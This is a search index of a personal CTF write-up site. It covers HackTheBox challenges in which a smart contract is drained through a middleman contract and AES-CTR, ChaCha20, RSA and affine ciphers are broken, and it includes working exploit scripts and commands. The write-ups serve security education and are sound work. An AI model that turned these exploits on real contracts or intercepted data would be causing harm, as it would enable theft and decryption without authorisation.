{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"],"fields":{"title":{"boost":1000.0},"text":{"boost":1.0},"tags":{"boost":1000000.0}}},"docs":[{"location":"","title":"CTF Challenges Repository","text":"<p>A comprehensive collection of my personal writeups and solutions from various Capture The Flag (CTF) competitions and platforms. This repository documents my journey through cybersecurity challenges, providing detailed explanations and methodologies to help others learn.</p>"},{"location":"#about-this-repository","title":"About This Repository","text":"<p>This repository contains writeups from different CTF platforms and competitions, covering various categories including:</p> <ul> <li>Cryptography - Breaking ciphers and cryptographic protocols</li> <li>Binary Exploitation (Pwn) - Memory corruption and exploitation techniques</li> <li>Reverse Engineering - Analyzing and understanding compiled binaries</li> <li>Web Exploitation - Finding and exploiting web application vulnerabilities</li> <li>Forensics - Investigating and analyzing digital artifacts</li> <li>Blockchain - Smart contract vulnerabilities and blockchain security</li> <li>OSINT - Open source intelligence gathering</li> </ul> <p>Each writeup includes step-by-step solutions, tools used, and key takeaways from the challenges.</p>"},{"location":"#platforms-competitions","title":"Platforms &amp; Competitions","text":""},{"location":"#hackthebox","title":"HackTheBox","text":"<p>Professional penetration testing labs and realistic security challenges. Contains writeups for retired machines and various challenge categories.</p> <p>Categories: Blockchain, Crypto, Pwn, Reversing, Web Challenges: 11+</p>"},{"location":"#cyberedu","title":"CyberEDU","text":"<p>Educational cybersecurity platform challenges and training exercises.</p>"},{"location":"#pwnablekr","title":"pwnable.kr","text":"<p>Binary exploitation challenges with progressive difficulty levels, from beginner-friendly to advanced exploitation techniques.</p> <p>Focus: System exploitation, buffer overflows, ARM architecture Challenges: 10+</p>"},{"location":"#rocsc-2025","title":"ROCSC 2025","text":"<p>Romanian Cybersecurity Challenge - Premier national competition featuring advanced challenges across multiple domains.</p> <p>Focus: Mathematical cryptanalysis, OSINT, steganography, algorithms Challenges: 4</p>"},{"location":"#hackthebox-university-2025","title":"HackTheBox-University 2025","text":"<p>HackTheBox CTF contest for universities all around the globe. Achieved 34 place globally and 1'st place nationally.</p> <p>Focus Binary exploitation, reverse engineering and web Challenges: 10+</p>"},{"location":"#ism-ctf-2025","title":"ISM CTF 2025","text":"<p>University CTF contest. I only posted the hardest challenge (which was only solved by me).</p> <p>Focus Reverse engineering Challenges: 1</p>"},{"location":"#rocsc-quals2026","title":"ROCSC-Quals2026","text":"<p>ROCSC quals phase.</p> <p>Focus Cryptography, Web, OSINT, Pwn, Misc, Mobile, Steganography, ML/AI, Network Challenges: 16</p> <p>Each challenge directory contains: - <code>description.md</code> - Detailed writeup - <code>exploit.py</code> or relevant scripts - Automation scripts and exploits - Supporting files and resources</p>"},{"location":"#how-to-use-this-repository","title":"How to Use This Repository","text":"<ol> <li>Navigate to the platform or competition folder</li> <li>Browse the index to find challenges by category</li> <li>Read the writeup for step-by-step solutions</li> <li>Learn from the methodology and tools used</li> <li>Try to solve similar challenges on your own</li> </ol>"},{"location":"#contributions-feedback","title":"Contributions &amp; Feedback","text":"<p>Found an alternative solution? Have suggestions for improvement? Feel free to:</p> <ul> <li>Open an issue for discussion</li> <li>Submit a pull request with improvements</li> <li>Share your own approaches and techniques</li> </ul>"},{"location":"#disclaimer","title":"Disclaimer","text":"<p>These writeups are for educational purposes only. All challenges documented here are either: - From retired/archived machines and challenges - Explicitly allowed to be shared by the platform - From competitions where sharing is permitted</p> <p>Always respect platform rules and only attempt challenges on systems you have permission to test.</p>"},{"location":"#connect","title":"Connect","text":"<p>If you found these writeups helpful or have questions, feel free to reach out!</p> <p>GitHub: andrei2308</p> <p>Happy Hacking! \ud83d\ude80\ud83d\udd10</p>"},{"location":"HackTheBox/","title":"HackTheBox Challenges","text":"<p>This directory contains writeups for various HackTheBox challenges organized by category.</p>"},{"location":"HackTheBox/#blockchain","title":"Blockchain","text":"Challenge Description DistractAndDestroy Blockchain exploitation challenge"},{"location":"HackTheBox/#crypto","title":"Crypto","text":"Challenge Description BabyEncryption Basic encryption challenge Hidden Handshake Cryptographic protocol analysis RSAisEasy RSA cryptography challenge TheLastDance Advanced cryptographic puzzle"},{"location":"HackTheBox/#pwn","title":"Pwn","text":"Challenge Description CubeMadness1 Binary exploitation challenge"},{"location":"HackTheBox/#reversing","title":"Reversing","text":"Challenge Description BehindTheScenes Reverse engineering challenge SimpleEncryptor Binary analysis and decryption SpookyPass Password extraction challenge"},{"location":"HackTheBox/#web","title":"Web","text":"Challenge Description FlagCommand Web exploitation challenge Spookifier Web application security <p>Total Challenges: 11 Categories: Blockchain, Crypto, Pwn, Reversing, Web</p> <p>Back to Main Repository</p>"},{"location":"HackTheBox/blockchain/DistractAndDestroy/description/","title":"Web CTF Challenge: Distract and Destroy","text":""},{"location":"HackTheBox/blockchain/DistractAndDestroy/description/#challenge-description","title":"Challenge Description","text":"<p>After defeating her first monster, Alex stood frozen, staring up at another massive, hulking creature that loomed over her. She knew that this was a fight she couldn't win on her own. She turned to her guildmates, trying to come up with a plan. \"We need to distract it,\" Alex said. \"If we can get it off balance, we might be able to take it down.\" Her guildmates nodded, their eyes narrowed in determination. They quickly came up with a plan to lure the monster away from their position, using a combination of noise and movement to distract it. As they put their plan into action, Alex drew her sword and waited for her chance.</p> <p>This time we are provided with a blockchain challenge.</p>"},{"location":"HackTheBox/blockchain/DistractAndDestroy/description/#setup","title":"Setup","text":"<p>Reading the instructions from the site we are given: - A private key - The addresses of the contracts  - Our address - The RPC URL to which we will make the calls</p>"},{"location":"HackTheBox/blockchain/DistractAndDestroy/description/#contract-analysis","title":"Contract Analysis","text":""},{"location":"HackTheBox/blockchain/DistractAndDestroy/description/#setup-contract","title":"Setup Contract","text":"<p>Let's take a look first at the smart contracts. The setup contract deploys our Creature contract and has an <code>isSolved</code> function:</p> <pre><code>function isSolved() public view returns (bool) {\n    return address(TARGET).balance == 0;\n}\n</code></pre> <p>This function tells us that in order to win the challenge we should empty the Creature contract.</p>"},{"location":"HackTheBox/blockchain/DistractAndDestroy/description/#creature-contract","title":"Creature Contract","text":"<p>Let's dive into the creature contract.</p>"},{"location":"HackTheBox/blockchain/DistractAndDestroy/description/#loot-function","title":"Loot Function","text":"<p>We have to call the <code>loot</code> function in order to empty the contract:</p> <pre><code>function loot() external {\n    require(lifePoints == 0, \"Creature is still alive!\");\n    payable(msg.sender).transfer(address(this).balance);\n}\n</code></pre> <p>However, we can only loot when the creature has 0 life points.</p>"},{"location":"HackTheBox/blockchain/DistractAndDestroy/description/#attack-function","title":"Attack Function","text":"<p>To attack the creature we can call the function:</p> <pre><code>function attack(uint256 _damage) external {\n    if (aggro == address(0)) {\n        aggro = msg.sender;\n    }\n\n    if (_isOffBalance() &amp;&amp; aggro != msg.sender) {\n        lifePoints -= _damage;\n    } else {\n        lifePoints -= 0;\n    }\n}\n</code></pre> <p>Which calls:</p> <pre><code>function _isOffBalance() private view returns (bool) {\n    return tx.origin != msg.sender;\n}\n</code></pre>"},{"location":"HackTheBox/blockchain/DistractAndDestroy/description/#vulnerability-analysis","title":"Vulnerability Analysis","text":"<p>At the first call of the <code>attack</code> function, the <code>aggro</code> is set to the message sender. Then, the <code>_isOffBalance()</code> checks if the <code>tx.origin</code> is different from the <code>msg.sender</code>. If it does AND the <code>aggro</code> is different from the message sender, then the damage is done.</p>"},{"location":"HackTheBox/blockchain/DistractAndDestroy/description/#key-insight","title":"Key Insight","text":"<p>The key point here is that: - <code>tx.origin</code> is the address of the one who initiated the transaction - <code>msg.sender</code> returns the address of the one who sent the transaction</p> <p>If we write a middleman contract which we can call to call the function <code>attack</code> in the Creature contract, the <code>tx.origin</code> and <code>msg.sender</code> will be different.</p> <p>However, we should first attack with our private key so the <code>aggro</code> will be permanently set to our address, because otherwise it would be set to our contract address and we could not attack.</p>"},{"location":"HackTheBox/blockchain/DistractAndDestroy/description/#exploitation","title":"Exploitation","text":""},{"location":"HackTheBox/blockchain/DistractAndDestroy/description/#middleman-contract","title":"Middleman Contract","text":"<p>The middleman contract would look something like:</p> <pre><code>// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.13;\n\ncontract Middleman {\n    address public target = 0x9ADAFC44200a10b29583438397B6A81A969E48cc;\n\n    function attack(uint256 _damage) external {\n        (bool success, bytes memory result) = target.call(abi.encodeWithSignature(\"attack(uint256)\", _damage));\n        require(success, string(result));\n    }\n}\n</code></pre>"},{"location":"HackTheBox/blockchain/DistractAndDestroy/description/#step-by-step-solution","title":"Step-by-Step Solution","text":"<p>In order to do that we will use Foundry's tool <code>cast</code>.</p>"},{"location":"HackTheBox/blockchain/DistractAndDestroy/description/#step-1-set-aggro","title":"Step 1: Set Aggro","text":"<p>First, we will set our address as the aggro: <pre><code>cast send $ContractAddress \"attack(uint256)\" 1000 --private-key $PRIVATE_KEY --rpc-url http://$IP:$PORT/rpc\n</code></pre></p>"},{"location":"HackTheBox/blockchain/DistractAndDestroy/description/#step-2-deploy-middleman-contract","title":"Step 2: Deploy Middleman Contract","text":"<p>Secondly, we will deploy our middleman contract: <pre><code>forge create $PATH_TO_MIDDLEMAN_CONTRACT --rpc-url $RPC_URL --private-key $PRIVATE_KEY --broadcast\n</code></pre></p> <p>And the contract is deployed successfully:</p> <p></p>"},{"location":"HackTheBox/blockchain/DistractAndDestroy/description/#step-3-attack-through-middleman","title":"Step 3: Attack Through Middleman","text":"<p>Now, we only need to call the function in our newly deployed contract so it will attack the target contract: <pre><code>cast send $MIDDLEMAN_CONTRACT_ADDRESS \"attack(uint256)\" 1000 --rpc-url http://$IP:$PORT/rpc --private-key $PRIVATE_KEY\n</code></pre></p>"},{"location":"HackTheBox/blockchain/DistractAndDestroy/description/#step-4-loot-the-contract","title":"Step 4: Loot the Contract","text":"<p>After that, we can loot the contract: <pre><code>cast send $TARGET_CONTRACT_ADDRESS \"loot()()\" --private-key $PRIVATE_KEY --rpc-url http://$IP:$PORT/rpc\n</code></pre></p> <p>Now, the target contract is empty and the flag is revealed back in browser.</p> <p>Vulnerability Type: <code>tx.origin</code> vs <code>msg.sender</code> confusion Key Technique: Middleman contract to manipulate call context Tools Used: Foundry (cast, forge)  </p>"},{"location":"HackTheBox/crypto/BabyEncryption/description/","title":"Cryptography CTF Challenge: BabyEncryption","text":""},{"location":"HackTheBox/crypto/BabyEncryption/description/#challenge-description","title":"Challenge Description","text":"<p>You are after an organised crime group which is responsible for the illegal weapon market in your country. As a secret agent, you have infiltrated the group enough to be included in meetings with clients. During the last negotiation, you found one of the confidential messages for the customer. It contains crucial information about the delivery. Do you think you can decrypt it?</p>"},{"location":"HackTheBox/crypto/BabyEncryption/description/#files-provided","title":"Files Provided","text":""},{"location":"HackTheBox/crypto/BabyEncryption/description/#challpy","title":"chall.py","text":"<pre><code>import string\nfrom secret import MSG\n\ndef encryption(msg):\n    ct = []\n    for char in msg:\n        ct.append((123 * char + 18) % 256)\n    return bytes(ct)\n\nct = encryption(MSG)\nf = open('./msg.enc','w')\nf.write(ct.hex())\nf.close()\n</code></pre>"},{"location":"HackTheBox/crypto/BabyEncryption/description/#msgenc","title":"msg.enc","text":"<pre><code>6e0a9372ec49a3f6930ed8723f9df6f6720ed8d89dc4937222ec7214d89d1e0e352ce0aa6ec82bf622227bb70e7fb7352249b7d893c493d8539dec8fb7935d490e7f9d22ec89b7a322ec8fd80e7f8921\n</code></pre>"},{"location":"HackTheBox/crypto/BabyEncryption/description/#analysis","title":"Analysis","text":""},{"location":"HackTheBox/crypto/BabyEncryption/description/#understanding-the-encryption","title":"Understanding the Encryption","text":"<p>Looking at the encryption function, we can see it performs the following operation on each character: <pre><code>ciphertext = (123 * plaintext + 18) % 256\n</code></pre></p> <p>This is a simple affine cipher with: - Multiplicative key: <code>123</code> - Additive key: <code>18</code> - Modulus: <code>256</code></p>"},{"location":"HackTheBox/crypto/BabyEncryption/description/#mathematical-approach","title":"Mathematical Approach","text":"<p>To decrypt, we need to reverse the encryption process: 1. Subtract the additive key: <code>(ciphertext - 18) % 256</code> 2. Multiply by the modular inverse of 123 modulo 256</p> <p>The decryption formula becomes: <pre><code>plaintext = ((ciphertext - 18) * inv(123)) % 256\n</code></pre></p>"},{"location":"HackTheBox/crypto/BabyEncryption/description/#finding-the-modular-inverse","title":"Finding the Modular Inverse","text":"<p>We need to find the modular inverse of 123 modulo 256 using the Extended Euclidean Algorithm.</p>"},{"location":"HackTheBox/crypto/BabyEncryption/description/#solution","title":"Solution","text":""},{"location":"HackTheBox/crypto/BabyEncryption/description/#exploit-script","title":"Exploit Script","text":"<pre><code>#!/usr/bin/env python3\n\n# Read the encrypted file\nwith open('msg.enc', 'r') as f:\n    hex_data = f.read().strip()\n\nciphertext = bytes.fromhex(hex_data)\nprint(f\"Ciphertext: {hex_data}\")\n\n# Find modular inverse of 123 mod 256 using Extended Euclidean Algorithm\ndef mod_inverse(a, m):\n    def extended_gcd(a, b):\n        if a == 0:\n            return b, 0, 1\n        gcd, x1, y1 = extended_gcd(b % a, a)\n        x = y1 - (b // a) * x1\n        y = x1\n        return gcd, x, y\n\n    gcd, x, y = extended_gcd(a, m)\n    if gcd != 1:\n        return None\n    return (x % m + m) % m\n\n# Decrypt: pt = (ct - 18) * inv(123) mod 256\ninv_123 = mod_inverse(123, 256)\nprint(f\"Inverse of 123 mod 256: {inv_123}\")\n\ndecrypted = []\nfor ct_byte in ciphertext:\n    pt = ((ct_byte - 18) * inv_123) % 256\n    decrypted.append(pt)\n\n# Convert to string\nflag = ''.join(chr(b) for b in decrypted)\nprint(f\"\\n*** FLAG: {flag} ***\")\n</code></pre>"},{"location":"HackTheBox/crypto/BabyEncryption/description/#execution-process","title":"Execution Process","text":"<ol> <li>Read the encrypted data from the hex file</li> <li>Calculate the modular inverse of 123 modulo 256 using Extended Euclidean Algorithm</li> <li>Apply the decryption formula to each byte of the ciphertext</li> <li>Convert the decrypted bytes back to ASCII characters to reveal the flag</li> </ol>"},{"location":"HackTheBox/crypto/BabyEncryption/description/#key-mathematical-concepts","title":"Key Mathematical Concepts","text":"<ul> <li>Affine Cipher: A type of substitution cipher using linear transformation</li> <li>Modular Inverse: Finding <code>x</code> such that <code>(123 * x) \u2261 1 (mod 256)</code></li> <li>Extended Euclidean Algorithm: Used to find modular inverses when gcd(a,m) = 1</li> </ul>"},{"location":"HackTheBox/crypto/BabyEncryption/description/#result","title":"Result","text":"<p>Running the exploit script successfully decrypts the message and reveals the flag containing the crucial delivery information the secret agent was looking for.</p> <p>Vulnerability Type: Weak Cryptographic Implementation (Simple Affine Cipher) Key Technique: Modular Arithmetic and Inverse Calculation Tools Used: Python, Extended Euclidean Algorithm  </p>"},{"location":"HackTheBox/crypto/Hidden%20Handshake/description/","title":"Hidden Handshake - CTF Write-up","text":""},{"location":"HackTheBox/crypto/Hidden%20Handshake/description/#challenge-information","title":"Challenge Information","text":"<p>Title: Hidden Handshake</p> <p>Description: Amidst the static hum of Volnaya's encrypted comms, Task Force Phoenix detects a subtle, silent handshake\u2014a fleeting, ghostly link hidden beneath layers of noise. Your objective: capture, decode, and neutralize this quiet whisper before it escalates into a deafening roar that plunges nations into chaos.</p>"},{"location":"HackTheBox/crypto/Hidden%20Handshake/description/#analysis","title":"Analysis","text":"<p>Looking at the <code>server.py</code> file, we can identify this as a cryptography challenge where we need to decrypt a message to obtain the flag.</p> <p>Analyzing the code reveals the following key points:</p> <ul> <li>The program takes <code>pass2</code> as input from the user and uses it in the encryption scheme</li> <li>The program takes <code>username</code> as input from the user and includes it in the final message  </li> <li>The program returns an encrypted message containing the flag and username</li> <li>The encryption scheme used is AES in Counter (CTR) mode</li> </ul>"},{"location":"HackTheBox/crypto/Hidden%20Handshake/description/#vulnerability-nonce-reuse","title":"Vulnerability: Nonce Reuse","text":"<p>The critical vulnerability lies in how AES CTR mode is implemented:</p> <ul> <li>AES CTR mode uses <code>pass2</code> as the nonce</li> <li>If we send two inputs with the same <code>pass2</code>, we get two encrypted messages using the same nonce</li> <li>Nonce reuse in CTR mode is a critical vulnerability</li> </ul>"},{"location":"HackTheBox/crypto/Hidden%20Handshake/description/#how-aes-ctr-mode-works","title":"How AES CTR Mode Works","text":"<p>AES CTR mode encrypts data by: 1. Generating a keystream based on the nonce 2. XORing the keystream with plaintext blocks 3. Same nonce = Same keystream</p>"},{"location":"HackTheBox/crypto/Hidden%20Handshake/description/#attack-strategy","title":"Attack Strategy","text":"<p>Our attack leverages the nonce reuse vulnerability:</p> <ol> <li>Send two requests with identical <code>pass2</code> values (same nonce)</li> <li>First request: Use a very long username to recover more keystream</li> <li>Second request: Use a short username to decrypt more of the message</li> </ol>"},{"location":"HackTheBox/crypto/Hidden%20Handshake/description/#keystream-recovery","title":"Keystream Recovery","text":"<p>Since: <code>Ciphertext = Plaintext \u2295 Keystream</code></p> <p>We can recover the keystream: <code>Keystream = Plaintext \u2295 Ciphertext</code></p> <p>With a long known plaintext, we recover a large portion of the keystream, which we can then use to decrypt the shorter message containing the flag.</p>"},{"location":"HackTheBox/crypto/Hidden%20Handshake/description/#exploitation","title":"Exploitation","text":""},{"location":"HackTheBox/crypto/Hidden%20Handshake/description/#inputs-sent-to-server","title":"Inputs Sent to Server:","text":"<ul> <li>Request 1: <code>pass2 = \"constant\"</code>, <code>username = \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"</code></li> <li>Request 2: <code>pass2 = \"constant\"</code>, <code>username = \"a\"</code></li> </ul>"},{"location":"HackTheBox/crypto/Hidden%20Handshake/description/#exploit-code","title":"Exploit Code:","text":"<pre><code>from pwn import xor\n\n# Known plaintext and corresponding ciphertext from first request (long username)\nplain_text_1 = b\"Agent aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa, your clearance for Operation Blackout is: \"\ncypher_text_1 = bytes.fromhex(\"eabaf4a21006a44e95cb3d0a4fa71af5ad6cb409dc3a3002d42365b96d05e8cba5857ecd2a037749ae3e912d1fb32ebf0845d448393640e3db5496254e0e25023763b45c8191b6e4bcd1b62f03925b31be8804d4b5b393546256cbf69cb95c79963f54f76bb3e569eae510de60f31918538625ed21c5b0dd87347d85471c88bd1cb0783e15cda3a37ba96867a32ffe951357d3e2dc409facb82bf1ba9d545c7ca95b4b1c124f202c234e86e3582638a26d45a40f2b338275fced9d090b060c8f43dce778f16d14901e20a4a794838a5804ad1009135b1add96773ad1ceb125d5525bb40e5fa2a6de05c48e376353f6b460690a307cab0de48fd6241132d6ac9ebdf55abaf7587200131ea2162e6abaf8f1470632eab1622c\")\n\n# Plaintext and ciphertext from second request (short username)  \nplain_text_2 = b\"Agent a, your clearance for Operation Blackout is: \"\ncypher_text_2 = bytes.fromhex(\"eabaf4a21006a403d4d3331e5ce618f8a96ca709d3383443d32d76f84314ecd8a59076c325425444ae3c9b230ba66fb71a1e95610c155af489478e1b415e2750775d8a62d4afb5b4a9efa43e5390430fb4da1cc6a0a0c1016e68d8a488ab0e65d97e7ce22abbf728e6e51fdb60e6170b4bc730e421d0f1c589203c8f431899fc09f431345ad1bfe577b76067a527ff985614dae3c809b4b9b32df9af9815\")\n\n# Recover keystream by XORing known plaintext with its ciphertext\nkeystream = xor(plain_text_1, cypher_text_1)\nprint(\"Keystream:\", keystream)\n\n# Use recovered keystream to decrypt the second message\ndecrypted_message = xor(cypher_text_2, keystream)\nprint(\"Decrypted message:\", decrypted_message.decode('utf-8'))\n</code></pre>"},{"location":"HackTheBox/crypto/Hidden%20Handshake/description/#key-takeaways","title":"Key Takeaways","text":"<ul> <li>Never reuse nonces in CTR mode - this breaks the security completely</li> <li>Known plaintext attacks become trivial when keystreams are reused  </li> <li>AES CTR mode requires unique nonces for each encryption operation</li> <li>Stream cipher reuse is a fundamental cryptographic vulnerability</li> </ul> <p>The flag is revealed in the decrypted message from the second request.</p>"},{"location":"HackTheBox/crypto/RSAisEasy/description/","title":"Description","text":"<p>Here is a cleaned up, verified, and enhanced version of your description in proper Markdown format for use in a <code>description.md</code> file on GitHub:</p>"},{"location":"HackTheBox/crypto/RSAisEasy/description/#cryptography-ctf-challenge-rsaiseasy","title":"\ud83d\udd10 Cryptography CTF Challenge: RSAisEasy","text":""},{"location":"HackTheBox/crypto/RSAisEasy/description/#challenge-description","title":"\ud83e\udde9 Challenge Description","text":"<p>\"I think this is safe... Right?\"</p> <p>Welcome to the RSAisEasy cryptography challenge. In this task, you're presented with an RSA-based encryption script and some output data. Your mission is to analyze and decrypt the given ciphertexts using insights from RSA vulnerabilities.</p>"},{"location":"HackTheBox/crypto/RSAisEasy/description/#given-data","title":"\ud83e\uddfe Given Data","text":"<p>You are provided with:</p> <ul> <li><code>n1</code>: The modulus for the first ciphertext. As per RSA, <code>n1 = p * q</code>, where <code>p</code> and <code>q</code> are large primes.</li> <li><code>c1</code>: The first encrypted part of the flag.</li> <li><code>c2</code>: The second encrypted part of the flag.</li> <li>An interesting equation:</li> </ul> <pre><code>combined = (n1 * E) + n2\n</code></pre> <p>Here, <code>E</code> is a random 69-byte number, and <code>n2</code> is another RSA modulus. The value of <code>combined</code> is provided.</p>"},{"location":"HackTheBox/crypto/RSAisEasy/description/#known-facts","title":"\ud83d\udd11 Known Facts","text":"<ul> <li>The RSA exponent used is <code>e = 65536</code>, a common choice in RSA.</li> <li>The moduli <code>n1</code> and <code>n2</code> share a common prime factor <code>q</code>, meaning:</li> </ul> <pre><code>gcd(n1, n2) = q\n</code></pre>"},{"location":"HackTheBox/crypto/RSAisEasy/description/#strategy-overview","title":"\ud83e\udde0 Strategy Overview","text":"<p>To decrypt the flags, we follow these steps:</p> <ol> <li>Recover <code>E</code>:    From the equation</li> </ol> <pre><code>combined = (n1 * E) + n2\n</code></pre> <p>we solve for <code>E</code>:</p> <pre><code>E = combined // n1\n</code></pre> <ol> <li>Recover <code>n2</code>:    Once <code>E</code> is known:</li> </ol> <pre><code>n2 = combined - (n1 * E)\n</code></pre> <ol> <li>Find the common factor <code>q</code>:    Since <code>n1</code> and <code>n2</code> share a factor:</li> </ol> <pre><code>q = gcd(n1, n2)\n</code></pre> <ol> <li>Factor <code>n1</code> and <code>n2</code>:    Knowing <code>q</code>, you can compute:</li> </ol> <pre><code>p = n1 // q\nz = n2 // q\n</code></pre> <ol> <li>Compute Euler's totient (<code>phi</code>) for both moduli:</li> </ol> <pre><code>phi1 = (p - 1) * (q - 1)\nphi2 = (z - 1) * (q - 1)\n</code></pre> <ol> <li>Compute the private exponents <code>d1</code> and <code>d2</code>:</li> </ol> <pre><code>d1 = inverse(e, phi1)\nd2 = inverse(e, phi2)\n</code></pre> <ol> <li>Decrypt the ciphertexts:</li> </ol> <pre><code>m1 = pow(c1, d1, n1)\nm2 = pow(c2, d2, n2)\n</code></pre> <ol> <li>Recover the flag.</li> </ol>"},{"location":"HackTheBox/crypto/RSAisEasy/description/#files-in-this-repository","title":"\ud83d\udcc1 Files in This Repository","text":"<ul> <li><code>encrypt.py</code>: The RSA encryption script used in this challenge.</li> <li><code>output.txt</code>: Contains <code>n1</code>, <code>c1</code>, <code>c2</code>, and <code>combined</code>.</li> <li><code>solve.py</code>: Script that implements the above decryption steps.</li> </ul>"},{"location":"HackTheBox/crypto/RSAisEasy/description/#python-exploit-script","title":"Python Exploit Script","text":"<p>Here\u2019s the Python script to exploit the challenge:</p> <pre><code>from math import gcd\nfrom numpy import size  # Note: 'size' from numpy is imported but not used\n\ndef inverse(u, v):\n    \"\"\"Computes the modular inverse of u modulo v using the Extended Euclidean Algorithm.\"\"\"\n    if v == 0:\n        raise ZeroDivisionError(\"Modulus cannot be zero\")\n    if v &lt; 0:\n        raise ValueError(\"Modulus cannot be negative\")\n\n    # Extended Euclidean Algorithm\n    u3, v3 = u, v\n    u1, v1 = 1, 0\n    while v3 &gt; 0:\n        q = u3 // v3\n        u1, v1 = v1, u1 - v1 * q\n        u3, v3 = v3, u3 - v3 * q\n    if u3 != 1:\n        raise ValueError(\"No inverse value can be computed\")\n    while u1 &lt; 0:\n        u1 = u1 + v\n    return u1\n\n# Read values from output.txt\nwith open('output.txt', 'r') as f:\n    lines = f.readlines()\n\n# Parse the RSA parameters and combined value\nn1 = int(lines[0].split(': ')[1])\nc1 = int(lines[1].split(': ')[1])\nc2 = int(lines[2].split(': ')[1])\ncombined = int(lines[3].split(': ')[1])\n\n# Solve for E from the equation: combined = (n1 * E) + n2\nE = combined // n1\nn2 = combined - n1 * E  # Recover n2\n\n# Find common factor q using GCD (since n1 and n2 share q)\ngcd = gcd(n1, n2)\nprint(gcd)\n\n# Factor n1 and n2 using q\nz = n2 // gcd  # z is the other factor of n2\np = n1 // gcd  # p is the other factor of n1\nprint(z)\nprint(p)\n\n# Compute private exponent for flag 1\nphi1 = (p - 1) * (gcd - 1)\nd1 = inverse(0x10001, phi1)  # Compute modular inverse of e mod phi1\nflag1 = pow(c1, d1, n1)  # Decrypt flag1\nflag1_bytes = flag1.to_bytes((flag1.bit_length() + 7) // 8, 'big')\nprint(flag1_bytes.decode())\n\n# Compute private exponent for flag 2\nphi2 = (z - 1) * (gcd - 1)\nd2 = inverse(0x10001, phi2)\nflag2 = pow(c2, d2, n2)  # Decrypt flag2\nflag2_bytes = flag2.to_bytes((flag1.bit_length() + 7) // 8, 'big')\nprint(flag2_bytes.decode())\n\n# Print the full flag\nprint(flag1_bytes.decode() + flag2_bytes.decode())\n</code></pre>"},{"location":"HackTheBox/crypto/RSAisEasy/description/#vulnerability-exploited","title":"\ud83d\udea8 Vulnerability Exploited","text":"<p>This challenge highlights the dangers of key reuse and shared primes across different RSA keys. Once a common factor is found between two moduli, RSA's security is broken due to easy factorization.</p>"},{"location":"HackTheBox/crypto/TheLastDance/description/","title":"Cryptography CTF Challenge: The Last Dance","text":""},{"location":"HackTheBox/crypto/TheLastDance/description/#challenge-description","title":"Challenge Description","text":"<p>To be accepted into the upper class of the Berford Empire, you had to attend the annual Cha-Cha Ball at the High Court. Little did you know that among the many aristocrats invited, you would find a burned enemy spy. Your goal quickly became to capture him, which you succeeded in doing after putting something in his drink. Many hours passed in your agency's interrogation room, and you eventually learned important information about the enemy agency's secret communications. Can you use what you learned to decrypt the rest of the messages?</p>"},{"location":"HackTheBox/crypto/TheLastDance/description/#files-provided","title":"Files Provided","text":""},{"location":"HackTheBox/crypto/TheLastDance/description/#sourcepy","title":"source.py","text":"<pre><code>from Crypto.Cipher import ChaCha20\nfrom secret import FLAG\nimport os\n\ndef encryptMessage(message, key, nonce):\n    cipher = ChaCha20.new(key=key, nonce=iv)\n    ciphertext = cipher.encrypt(message)\n    return ciphertext\n\ndef writeData(data):\n    with open(\"out.txt\", \"w\") as f:\n        f.write(data)\n\nif __name__ == \"__main__\":\n    message = b\"Our counter agencies have intercepted your messages and a lot \"\n    message += b\"of your agent's identities have been exposed. In a matter of \"\n    message += b\"days all of them will be captured\"\n\n    key, iv = os.urandom(32), os.urandom(12)\n\n    encrypted_message = encryptMessage(message, key, iv)\n    encrypted_flag = encryptMessage(FLAG, key, iv)\n\n    data = iv.hex() + \"\\n\" + encrypted_message.hex() + \"\\n\" + encrypted_flag.hex()\n    writeData(data)\n</code></pre>"},{"location":"HackTheBox/crypto/TheLastDance/description/#outtxt","title":"out.txt","text":"<pre><code>c4a66edfe80227b4fa24d431\n7aa34395a258f5893e3db1822139b8c1f04cfab9d757b9b9cca57e1df33d093f07c7f06e06bb6293676f9060a838ea138b6bc9f20b08afeb73120506e2ce7b9b9dcd9e4a421584cfaba2481132dfbdf4216e98e3facec9ba199ca3a97641e9ca9782868d0222a1d7c0d3119b867edaf2e72e2a6f7d344df39a14edc39cb6f960944ddac2aaef324827c36cba67dcb76b22119b43881a3f1262752990\n7d8273ceb459e4d4386df4e32e1aecc1aa7aaafda50cb982f6c62623cf6b29693d86b15457aa76ac7e2eef6cf814ae3a8d39c7\n</code></pre>"},{"location":"HackTheBox/crypto/TheLastDance/description/#vulnerability-analysis","title":"Vulnerability Analysis","text":""},{"location":"HackTheBox/crypto/TheLastDance/description/#chacha20-nonce-reuse","title":"ChaCha20 Nonce Reuse","text":"<p>The critical vulnerability in this implementation is nonce reuse. Looking at the source code:</p> <ol> <li>Same key and nonce used: Both the message and flag are encrypted with identical <code>key</code> and <code>iv</code> (nonce)</li> <li>Stream cipher vulnerability: ChaCha20 is a stream cipher that generates a keystream based on key+nonce</li> <li>Identical keystreams: Using the same key+nonce produces identical keystreams for both encryptions</li> </ol>"},{"location":"HackTheBox/crypto/TheLastDance/description/#mathematical-foundation","title":"Mathematical Foundation","text":"<p>When the same keystream is used: - <code>C1 = M1 \u2295 keystream</code> (encrypted_message) - <code>C2 = M2 \u2295 keystream</code> (encrypted_flag) - <code>C1 \u2295 C2 = M1 \u2295 M2</code> - Therefore: <code>M2 = M1 \u2295 C1 \u2295 C2</code></p> <p>Since we know <code>M1</code> (the message), we can recover <code>M2</code> (the flag).</p>"},{"location":"HackTheBox/crypto/TheLastDance/description/#exploitation","title":"Exploitation","text":""},{"location":"HackTheBox/crypto/TheLastDance/description/#attack-strategy","title":"Attack Strategy","text":"<ol> <li>Extract keystream from known plaintext message</li> <li>Use keystream to decrypt the flag</li> <li>Verify using direct XOR method</li> </ol>"},{"location":"HackTheBox/crypto/TheLastDance/description/#exploit-script","title":"Exploit Script","text":"<pre><code>#!/usr/bin/env python3\n\"\"\"\nChaCha20 Nonce Reuse Attack\nExploits the vulnerability where the same key+nonce is used for multiple encryptions\n\"\"\"\n\ndef xor_bytes(a, b):\n    \"\"\"XOR two byte arrays\"\"\"\n    